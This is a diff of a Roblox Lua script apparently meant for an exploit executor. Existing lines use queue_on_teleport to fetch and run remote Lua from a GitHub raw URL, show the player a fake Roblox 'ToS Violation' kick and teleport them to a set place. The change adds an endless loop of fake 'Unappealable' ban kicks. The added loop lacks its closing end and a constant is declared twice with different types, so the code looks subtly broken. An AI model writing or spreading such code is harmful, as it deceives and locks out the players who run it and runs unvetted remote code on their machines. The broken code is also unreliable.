@@ -1,3 +1,4 @@
+local me = game.Players.LocalPlayer
 local TeleportService = game:GetService("TeleportService")
 local StarterGui = game:GetService("StarterGui")
 local Players = game:GetService("Players")
@@ -7,7 +8,10 @@ local samKalishia = "132059917051749"
 local samKalishia = 132059917051749
 
 if game.PlaceId == samKalishia then
-    error("Error on ohook")
+    while true do
+        wait(0.10)
+        me:Kick("ROBLOX ToS Violation(s): Exploiting. - Unappealable!")
+        wait(0.01)
 end
 
 -- script continues here if PlaceId is NOT samKalishia
@@ -24,7 +28,6 @@ if syn and syn.queue_on_teleport then
 elseif queue_on_teleport then
     queue_on_teleport(game:HttpGet("https://raw.githubusercontent.com/CryWinkleSam/get/refs/heads/main/305.lua"))
 end
-local me = game.Players.LocalPlayer
 me:Kick("ROBLOX ToS Violation(s): Exploiting. - If you think this is a mistake, Visit our website to appeal.")
 wait(3)
 TeleportService:Teleport(samKalishia)
